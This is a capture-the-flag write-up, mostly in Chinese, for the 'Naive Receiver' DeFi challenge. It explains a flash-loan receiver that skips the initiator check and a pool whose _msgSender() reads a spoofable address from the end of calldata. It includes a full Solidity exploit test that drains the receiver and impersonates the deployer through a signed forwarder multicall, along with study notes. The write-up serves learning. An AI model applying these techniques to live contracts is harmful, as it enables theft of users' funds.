# Naive Receiver

There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

现有一个资金池，余额为 1000 枚 WETH，支持闪电贷功能，固定手续费为 1 枚 WETH。该资金池通过集成一个无权限转发合约（BasicForwarder），支持元交易。
一名用户部署了一个示例合约，余额为 10 枚 WETH。该合约似乎可以执行 WETH 闪电贷操作。
所有资金均处于风险之中！请从用户合约（FlashLoanReceiver）和资金池（pool）中救出所有 WETH，并将其存入指定的回收账户。

# 解决办法

## 漏洞代码1
FlashLoanReceiver中的onFlashLoan()函数
```solidity
function onFlashLoan(
    address,  // 忽略了闪贷发起者（initiator）参数
    address token, 
    uint256 amount, 
    uint256 fee, 
    bytes calldata
) external returns (bytes32) {
    // 仅校验：调用者是否为闪贷池（pool）
    assembly {
        if iszero(eq(sload(pool.slot), caller())) {
            mstore(0x00, 0x48f5c3ed) 
            revert(0x1c, 0x04)
        }
    }
    if (token != address(NaiveReceiverPool(pool).weth())) {
        revert NaiveReceiverPool.UnsupportedCurrency();
    }

    uint256 amountToBeRepaid;
    unchecked {
        amountToBeRepaid = amount + fee;
    }
    _executeActionDuringFlashLoan();
    WETH(payable(token)).approve(pool, amountToBeRepaid);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

**漏洞本质是 “缺少对闪贷发起者的权限校验”，导致任何人都可以滥用合约身份调用闪贷池，间接动用合约内资金。**

## 漏洞代码2
NaiveReceiverPool合约的_msgSender()函数
```solidity
    function _msgSender() internal view override returns (address) {
    //我们可以构建一个交易，从forwarder合约调用该函数，从而伪造任意用户地址
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:])); 
        } else {
            return super._msgSender();
        }
    }
```
**这个函数仅仅通过msg.data的末尾20各字节获取用户地址，这并不安全，我们可以将部署者的地址放入到data的末尾中来盗取资金。**

## 攻击代码
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
        // 第一步：耗尽 Receiver
        bytes[] memory callDatas = new bytes[](11);
        for (uint256 i = 0; i < 10; i++) {
            callDatas[i] = abi.encodeCall(
                NaiveReceiverPool.flashLoan, (IERC3156FlashBorrower(address(receiver)), address(weth), 0, "0x")
            );
        }

        // 第二步：提取池中资金到恢复账户 通过forwarder的excute
        callDatas[10] = abi.encodePacked(
            //withraw只会读取前面两个参数
            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(address(deployer)))) // 地址填充为32字节，因为_msgSender只会读取最后20字节
        );

        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: gasleft(),
            nonce: forwarder.nonces(player),
            data: multicallData,
            deadline: block.timestamp + 1 hours
        });

        bytes32 requestHash =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }
```
1. **耗尽 Receiver 合约的 WETH 余额**

   通过调用 `NaiveReceiverPool` 的 `flashLoan` 函数十次，每次借入金额为 0 WETH，但支付 1 WETH 的固定费用。由于 `FlashLoanReceiver` 合约初始有 10 WETH，十次调用后其余额被耗尽。


2. **利用漏洞提取 Pool 中的资金**

   **构造恶意调用数据**：使用 `abi.encodePacked` 将以下两部分数据打包：

     （1） `abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery)))`：正常调用 `withdraw` 函数，参数为提取全部资金到恢复地址。
     
     （2） `bytes32(uint256(uint160(address(deployer)))`：将 `deployer` 地址填充为 32 字节，并附加在调用数据末尾。

  这样构造后，当 `withdraw` 函数通过 `delegatecall` 执行时，Pool 的 `_msgSender()` 函数会从调用数据末尾读取 `deployer` 地址，误认为是 `deployer` 在调用，从而绕过权限检查。

3. **最后两个步骤**
    
    （1）**打包为 Multicall**：将上述恶意调用数据与前10次 `flashLoan` 调用一起放入 `bytes[]` 数组，并通过 `abi.encodeCall(pool.multicall, callDatas)` 打包成单个 `multicallData`。
    
    （2）**通过 Forwarder 执行**：构造 `BasicForwarder.Request` 请求，包含 `multicallData`，并使用 `player` 的私钥对请求进行签名。最后调用 `forwarder.execute` 执行该元交易，从而在单次交易中完成所有操作。

     *ps: 之所以要通过Multicall，是为了使player不超过两笔交易就能达成目的。*


# 学到的零碎知识
- **元交易**：允许用户通过第三方（转发器）提交交易，节省Gas费用或实现更复杂的交互。
- **delegatecall**：一种特殊的合约调用方式，允许一个合约在另一个合约的上下文中执行代码，从而共享存储和状态。
- **msg.data**：包含调用合约时传递的完整数据，可以通过截取特定字节来获取参数信息。
- **地址**：以太坊地址是20字节（160位）的数据类型，通常表示为十六进制字符串。由公钥哈希加密取后20位。(原来地址不等于公钥。。我是大蠢猪)
- **assembly**：Solidity中的低级编程语言，允许直接操作EVM指令和内存，提高代码效率和灵活性，节省gas，但容易出漏洞，需谨慎检查。
- **签名流程**：`(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, 
requestHash); bytes memory signature = abi.encodePacked(r, s, v);`
- **地址转换为字节**：`bytes32(uint256(uint160(address(deployer))))` // 地址填充为32字节 显式经过 uint160 → uint256 转换，能明确表达 “先取原生地址值，再扩容补零” 的逻辑，避免因编译器版本差异导致的隐式转换问题（比如极端情况下的高位数据异常）
- **BasicForwarder**：一个简单的元交易转发器合约，允许用户通过签名请求由第三方代为执行交易，节省Gas费用并实现更复杂的交互逻辑。
- **从交易和签名中恢复地址**：`address signer = ECDSA.recover(_hashTypedData(getDataHash(request)), signature);`